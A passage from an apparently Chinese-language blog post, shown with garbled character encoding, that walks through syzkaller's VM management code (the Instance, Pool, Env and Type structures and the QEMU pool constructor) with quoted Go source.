å½“ä¸­æœ‰ç€ä¸€å¥—ç›¸åº”çš„è¡¨ç¤ºä¸ç®¡ç† Guest VM çš„ç»“æ„ä½“</p><h3 id="1-Instanceï¼šVM-å®ä¾‹"><a href="#1-Instanceï¼šVM-å®ä¾‹" class="headerlink" title="1. Instanceï¼šVM å®ä¾‹"></a>1. Instanceï¼šVM å®ä¾‹</h3><p><code>syz-manager</code> ä¸­çš„ VM å®é™…ä¸Šæ˜¯ä½¿ç”¨ä¸€ä¸ªåä¸º <code>Instance</code> çš„ç»“æ„ä½“æ¥è¡¨ç¤ºçš„ï¼Œå®šä¹‰äº <code>vm/vm.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">struct</span> &#123;<br>impl     vmimpl.Instance<br>workdir  <span class="hljs-type">string</span><br>timeouts targets.Timeouts<br>index    <span class="hljs-type">int</span><br>onClose  <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç±»ä¼¼åœ°ï¼Œå…¶éœ€è¦å®ç° <code>Interface</code> æ¥å£ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Instance è¡¨ç¤ºä¸€ä¸ªå•ç‹¬çš„ VM.</span><br><span class="hljs-keyword">type</span> Instance <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Copy å¤åˆ¶ä¸€ä¸ª hostSrc æ–‡ä»¶åˆ° VM ä¸­å¹¶è¿”å› VM ä¸­çš„æ–‡ä»¶å.</span><br>Copy(hostSrc <span class="hljs-type">string</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Forward è®¾ç½®ä»è™šæ‹Ÿæœºå†…åˆ°ä¸»æœºä¸Šç»™å®š tcp ç«¯å£çš„è½¬å‘ï¼Œ</span><br><span class="hljs-comment">// å¹¶è¿”å›è¦åœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨çš„åœ°å€.</span><br>Forward(port <span class="hljs-type">int</span>) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Run åœ¨è™šæ‹Ÿæœºå†…æ‰§è¡Œå‘½ä»¤ (ç±»ä¼¼ ssh cmd).</span><br><span class="hljs-comment">// outc æ¥å—æ··åˆäº†å‘½ä»¤è¡Œä¸å†…æ ¸æ§åˆ¶å°çš„è¾“å‡º.</span><br><span class="hljs-comment">// errc æ¥å—å‘½ä»¤ç­‰å¾…è¿”å› error æˆ– vmimpl.ErrTimeout.</span><br><span class="hljs-comment">// Command åœ¨ timeout ååœæ­¢. åœ¨ stop chan ä¸Šå‘é€å¯ä»¥ç”¨ä»¥æ›´æ—©å°†å…¶ç»ˆæ­¢.</span><br>Run(timeout time.Duration, stop &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, command <span class="hljs-type">string</span>) (outc &lt;-<span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span>, errc &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, err <span class="hljs-type">error</span>)<br><br><span class="hljs-comment">// Diagnose ä» VM ä¸Šæ£€ç´¢é¢å¤–çš„è°ƒè¯•ä¿¡æ¯</span><br><span class="hljs-comment">// (ä¾‹å¦‚é€šè¿‡å‘é€ä¸€äº› sys-rq&#x27;s æˆ– SIGABORT&#x27;ing ä¸€ä¸ª Go ç¨‹åº).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// é€‰æ‹©æ€§åœ°ç›´æ¥è¿”å› (ä¸€äº›æˆ–æ‰€æœ‰) ä¿¡æ¯. è‹¥ wait == true,</span><br><span class="hljs-comment">// è°ƒç”¨è€…å¿…é¡»ç­‰å¾… VM ç›´æ¥è¾“å‡ºä¿¡æ¯åˆ°å…¶æ—¥å¿—.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// rep æè¿°äº† Diagnose è¢«è°ƒç”¨çš„åŸå› .</span><br>Diagnose(rep *report.Report) (diagnosis []<span class="hljs-type">byte</span>, wait <span class="hljs-type">bool</span>)<br><br><span class="hljs-comment">// Close åœæ­¢å¹¶é”€æ¯ VM.</span><br>Close()<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Copy()</code>ï¼šå°†ä¸€ä¸ªæ¥è‡ªå®¿ä¸»æœºçš„æ–‡ä»¶æ‹·è´è‡³è™šæ‹Ÿæœºä¸­ï¼Œè¿”å›è™šæ‹Ÿæœºä¸­çš„æ–‡ä»¶å.</li><li><code>Forward()</code>ï¼šè®¾ç½®ä»è™šæ‹Ÿæœºå†…åˆ°ä¸»æœºä¸Šç»™å®š tcp ç«¯å£çš„è½¬å‘ï¼Œå¹¶è¿”å›è¦åœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨çš„åœ°å€</li><li><code>Run()</code>ï¼šåœ¨è™šæ‹Ÿæœºå†…æ‰§è¡Œå‘½ä»¤</li><li><code>Diagnose()</code>ï¼šåœ¨è™šæ‹Ÿæœºä¸Šæ£€ç´¢é¢å¤–çš„è°ƒè¯•ä¿¡æ¯</li><li><code>Close()</code>ï¼šåœæ­¢å¹¶é”€æ¯è™šæ‹Ÿæœº</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>ä¸åŒç±»å‹çš„ Guest VM æ‰€å®ç°çš„ Interface æ¥å£æ˜¯ä¸åŒçš„</strong></p><blockquote><p>ä»¥ QEMU ä¸ºä¾‹ï¼Œå…¶å®ç°ä¸»è¦ä½äº <code>vm/qemu/qemu.go</code> ä¸­</p></blockquote><h3 id="2-Poolï¼šVM-æ± "><a href="#2-Poolï¼šVM-æ± " class="headerlink" title="2.Poolï¼šVM æ± "></a>2.Poolï¼šVM æ± </h3><p>ç±»ä¼¼äºçº¿ç¨‹æ± çš„æ¦‚å¿µï¼Œåœ¨ <code>syz-manager</code> ä¸­ä½¿ç”¨ä¸€ä¸ª <strong>VM æ± </strong> â€”â€” <code>Pool</code> ç»“æ„ä½“æ¥ç®¡æ§ Guest VMï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>vm/vm.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">struct</span> &#123;<br>impl        vmimpl.Pool<br>workdir     <span class="hljs-type">string</span><br>template    <span class="hljs-type">string</span><br>timeouts    targets.Timeouts<br>activeCount <span class="hljs-type">int32</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥ç»“æ„ä½“å®ç°äº† <code>Pool</code> æ¥å£ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Pool è¡¨ç¤ºäº†ä¸€ç»„ç‰¹å®šç±»å‹çš„æµ‹è¯•æœºå™¨ (è™šæ‹Ÿæœº, ç‰©ç†è®¾å¤‡, etc).</span><br><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Count è¿”å›æ± ä¸­æ‰€æœ‰ VM çš„æ•°é‡.</span><br>Count() <span class="hljs-type">int</span><br><br><span class="hljs-comment">// Create åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªæ–°çš„ VM å®ä¾‹.</span><br>Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (Instance, <span class="hljs-type">error</span>)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Count()</code>ï¼šè¿”å›æ± ä¸­æ‰€æœ‰ VM çš„æ•°é‡</li><li><code>Create()</code>ï¼š<strong>æ–°å»ºå¹¶å¯åŠ¨ä¸€ä¸ª VMå®ä¾‹</strong>ï¼Œè¿”å›æ–°å»ºçš„å®ä¾‹å¯¹è±¡</li></ul><h4 id="QEMU-VM-æµ…æ"><a href="#QEMU-VM-æµ…æ" class="headerlink" title="QEMU VM æµ…æ"></a>QEMU VM æµ…æ</h4><p>ä»¥ QEMU ä¸ºä¾‹çš„ Pool æ¥å£å®ç°å¦‚ä¸‹ï¼Œå¯¹äº <code>Count()</code> è€Œè¨€ä¼šç›´æ¥è¿”å›é…ç½®æ–‡ä»¶ä¸­çš„è®¡æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Count() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> pool.cfg.Count<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Create()</code> åˆ™ä¼šé¦–å…ˆæ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿé•œåƒæ˜¯å¦ä¸º <code>9p</code> æ ¼å¼ï¼Œè‹¥æ˜¯åˆ™ä¼šç”Ÿæˆä¸€ä¸ª ssh key å­˜æ”¾åˆ° <code>key</code> æ–‡ä»¶ä¸­å¹¶ç”Ÿæˆä¸€ä¸ª <code>init.sh</code> æ–‡ä»¶ï¼›æ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨ <code>ctor()</code> å‡½æ•°åˆ›å»ºè™šæ‹Ÿæœºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>sshkey := pool.env.SSHKey<br>sshuser := pool.env.SSHUser<br><span class="hljs-keyword">if</span> pool.env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br>sshkey = filepath.Join(workdir, <span class="hljs-string">&quot;key&quot;</span>)<br>sshuser = <span class="hljs-string">&quot;root&quot;</span><br><span class="hljs-keyword">if</span> _, err := osutil.RunCmd(<span class="hljs-number">10</span>*time.Minute, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;ssh-keygen&quot;</span>, <span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;rsa&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, <span class="hljs-string">&quot;2048&quot;</span>,<br><span class="hljs-string">&quot;-N&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-C&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-f&quot;</span>, sshkey); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>initFile := filepath.Join(workdir, <span class="hljs-string">&quot;init.sh&quot;</span>)<br><span class="hljs-keyword">if</span> err := osutil.WriteExecFile(initFile, []<span class="hljs-type">byte</span>(strings.Replace(initScript, <span class="hljs-string">&quot;&#123;&#123;KEY&#125;&#125;&quot;</span>, sshkey, <span class="hljs-number">-1</span>))); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create init file: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ &#123;<br>inst, err := pool.ctor(workdir, sshkey, sshuser, index)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// Older qemu prints &quot;could&quot;, newer -- &quot;Could&quot;.</span><br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;ould not set up host forwarding rule&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;Device or resource busy&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>ctor()</code> çš„å®ç°æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯åˆ›å»ºä¸€ä¸ªå¸¦ç€ ssh key åŠä¸€äº›é…ç½®ä¿¡æ¯ä¸ä¸€ä¸ª channel çš„ <code>instance</code> å®ä¾‹ï¼Œåˆå§‹åŒ–å®ä¾‹å†…çš„ç®¡é“å¹¶è°ƒç”¨ <code>boot()</code> å‡½æ•°è¿›è¡Œæ­£å¼çš„åˆ›å»ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> ctor(workdir, sshkey, sshuser <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>inst := &amp;instance&#123;<br>index:      index,<br>cfg:        pool.cfg,<br>target:     pool.target,<br>archConfig: pool.archConfig,<br>version:    pool.version,<br>image:      pool.env.Image,<br>debug:      pool.env.Debug,<br>os:         pool.env.OS,<br>timeouts:   pool.env.Timeouts,<br>workdir:    workdir,<br>sshkey:     sshkey,<br>sshuser:    sshuser,<br>diagnose:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, <span class="hljs-number">1</span>),<br>&#125;<br><span class="hljs-keyword">if</span> st, err := os.Stat(inst.image); err != <span class="hljs-literal">nil</span> &amp;&amp; st.Size() == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Some kernels may not need an image, however caller may still</span><br><span class="hljs-comment">// want to pass us a fake empty image because the rest of syzkaller</span><br><span class="hljs-comment">// assumes that an image is mandatory. So if the image is empty, we ignore it.</span><br>inst.image = <span class="hljs-string">&quot;&quot;</span><br>&#125;<br>closeInst := inst<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> closeInst != <span class="hljs-literal">nil</span> &#123;<br>closeInst.Close()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst.rpipe, inst.wpipe, err = osutil.LongPipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-keyword">if</span> err := inst.boot(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br>closeInst = <span class="hljs-literal">nil</span><br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>boot()</code> å‡½æ•°ä¸»è¦å°±æ˜¯å„ç§å‚æ•°åˆ¤æ–­ï¼Œä¹‹å<strong>æŠŠ QEMU èµ·äº†ä»¥å ssh è¿ä¸Šå»</strong>ï¼Œè¿™é‡Œå°±ä¸æ‘˜æŠ„ä»£ç äº†ï¼šï¼‰</p><h3 id="3-Envï¼šå•ä¸ª-VM-Pool-çš„ç¯å¢ƒå˜é‡"><a href="#3-Envï¼šå•ä¸ª-VM-Pool-çš„ç¯å¢ƒå˜é‡" class="headerlink" title="3. Envï¼šå•ä¸ª  VM Pool çš„ç¯å¢ƒå˜é‡"></a>3. Envï¼šå•ä¸ª  VM Pool çš„ç¯å¢ƒå˜é‡</h3><p><code>Env</code> ç»“æ„ä½“ä¸ºç”¨äºä¸€ä¸ª VM Pool çš„ç¯å¢ƒå˜é‡ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Env åŒ…å«äº†ç”¨äº VM æ± çš„å…¨å±€å¸¸é‡å‚æ•°.</span><br><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// ç‹¬ç‰¹çš„åå­—</span><br><span class="hljs-comment">// è‹¥å‡ ä¸ª Pool å…±äº«äº†å…¨å±€å‘½åç©ºé—´åˆ™å¯è¢«ç”¨äº VM name çš„å†²çªè§£å†³</span><br>Name      <span class="hljs-type">string</span><br>OS        <span class="hljs-type">string</span> <span class="hljs-comment">// ç›®æ ‡ OS</span><br>Arch      <span class="hljs-type">string</span> <span class="hljs-comment">// ç›®æ ‡ arch</span><br>Workdir   <span class="hljs-type">string</span><br>Image     <span class="hljs-type">string</span><br>SSHKey    <span class="hljs-type">string</span><br>SSHUser   <span class="hljs-type">string</span><br>Timeouts  targets.Timeouts<br>Debug     <span class="hljs-type">bool</span><br>Config    []<span class="hljs-type">byte</span> <span class="hljs-comment">// json-åºåˆ—åŒ–çš„ VM-ç±»å‹-ç‰¹å®šé…ç½®</span><br>KernelSrc <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Typeï¼šVM-ç±»å‹"><a href="#4-Typeï¼šVM-ç±»å‹" class="headerlink" title="4. Typeï¼šVM ç±»å‹"></a>4. Typeï¼šVM ç±»å‹</h3><p>ä¸€ä¸ª VM Pool ä¸­åªèƒ½æœ‰ä¸€ç§ç±»å‹çš„ VMï¼Œå› è€Œä¸åŒç±»å‹çš„ VM çš„ Pool åº”å½“è¦æœ‰ä¸åŒçš„æ„é€ å‡½æ•°ï¼Œåœ¨ <code>syz-manager</code> ä¸­ä½¿ç”¨ <code>Type</code> ç»“æ„ä½“è¡¨ç¤ºä¸€ç§ VM çš„ç±»å‹ä¿¡æ¯ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Type <span class="hljs-keyword">struct</span> &#123;<br>Ctor       ctorFunc<br>Overcommit <span class="hljs-type">bool</span><br>&#125;<br><br><span class="hljs-keyword">type</span> ctorFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(env *Env)</span></span> (Pool, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>ctorFunc</code> ä¸ºæ„é€ å‡½æ•°ç±»å‹ï¼Œå…¶æ¥å—ä¸€ä¸ª <code>Env</code> ç±»å‹çš„ç»“æ„ä½“æŒ‡é’ˆï¼ˆå‚¨å­˜äº†å…¨å±€çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ª VM Pool å®ä¾‹</p><p>ç”±ä¸€ä¸ªå…¨å±€çš„ <code>stringâ†’Type</code> æ˜ å°„è¡¨å­˜å‚¨äº†ä¸åŒç±»å‹ VM çš„ä¿¡æ¯ï¼Œåœ¨æ­£å¼å¯åŠ¨ä¹‹å‰ç¨‹åºä¼šé€šè¿‡ <code>Register()</code> å‡½æ•°å°†ä¸åŒç±»å‹çš„ VM ä¿¡æ¯æ³¨å†Œåˆ°è¯¥è¡¨ä¸­ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Register åœ¨åŒ…ä¸­æ³¨å†Œä¸€ä¸ªæ–°çš„ VM ç±»å‹.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Register</span><span class="hljs-params">(typ <span class="hljs-type">string</span>, ctor ctorFunc, allowsOvercommit <span class="hljs-type">bool</span>)</span></span> &#123;<br>Types[typ] = Type&#123;<br>Ctor:       ctor,<br>Overcommit: allowsOvercommit,<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">var</span>(<br>    <span class="hljs-comment">//...</span><br>Types = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]Type)<br></code></pre></td></tr></table></figure><p>ä»¥ <code>QEMU</code> ä¸ºä¾‹ï¼Œå…¶åœ¨åŒ…è¢«å¯¼å…¥æ—¶æ³¨å†Œæ„é€ å‡½æ•°ï¼Œä¸»è¦æ˜¯è°ƒç”¨ <code>LoadData()</code> è§£æé…ç½®æ–‡ä»¶åè¿›è¡Œæ£€æŸ¥ï¼Œè¿™é‡Œä¸å†èµ˜å™ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> _ vmimpl.Infoer = (*instance)(<span class="hljs-literal">nil</span>)<br>vmimpl.Register(<span class="hljs-string">&quot;qemu&quot;</span>, ctor, <span class="hljs-literal">true</span>)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ctor</span><span class="hljs-params">(env *vmimpl.Env)</span></span> (vmimpl.Pool, <span class="hljs-type">error</span>) &#123;<br>archConfig := archConfigs[env.OS+<span class="hljs-string">&quot;/&quot;</span>+env.Arch]<br>cfg := &amp;Config&#123;<br>Count:       <span class="hljs-number">1</span>,<br>CPU:         <span class="hljs-number">1</span>,<br>Mem:         <span class="hljs-number">1024</span>,<br>ImageDevice: <span class="hljs-string">&quot;hda&quot;</span>,<br>Qemu:        archConfig.Qemu,<br>QemuArgs:    archConfig.QemuArgs,<br>NetDev:      archConfig.NetDev,<br>Snapshot:    <span class="hljs-literal">true</span>,<br>&#125;<br><span class="hljs-keyword">if</span> err := config.LoadData(env.Config, cfg); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to parse qemu vm config: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Count &lt; <span class="hljs-number">1</span> || cfg.Count &gt; <span class="hljs-number">128</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;invalid config param count: %v, want [1, 128]&quot;</span>, cfg.Count)<br>&#125;<br><span class="hljs-keyword">if</span> env.Debug &amp;&amp; cfg.Count &gt; <span class="hljs-number">1</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;limiting number of VMs from %v to 1 in debug mode&quot;</span>, cfg.Count)<br>cfg.Count = <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-keyword">if</span> _, err := exec.LookPath(cfg.Qemu); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br><span class="hljs-keyword">if</span> env.OS != targets.Linux &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image is supported for linux only&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Kernel == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image requires kernel&quot;</span>)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> !osutil.IsExist(env.Image) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;image file &#x27;%v&#x27; does not exist&quot;</span>, env.Image)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> cfg.CPU &lt;= <span class="hljs-number">0</span> || cfg.CPU &gt; <span class="hljs-number">1024</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu cpu: %v, want [1-1024]&quot;</span>, cfg.CPU)<br>&#125;<br><span class="hljs-keyword">if</span> 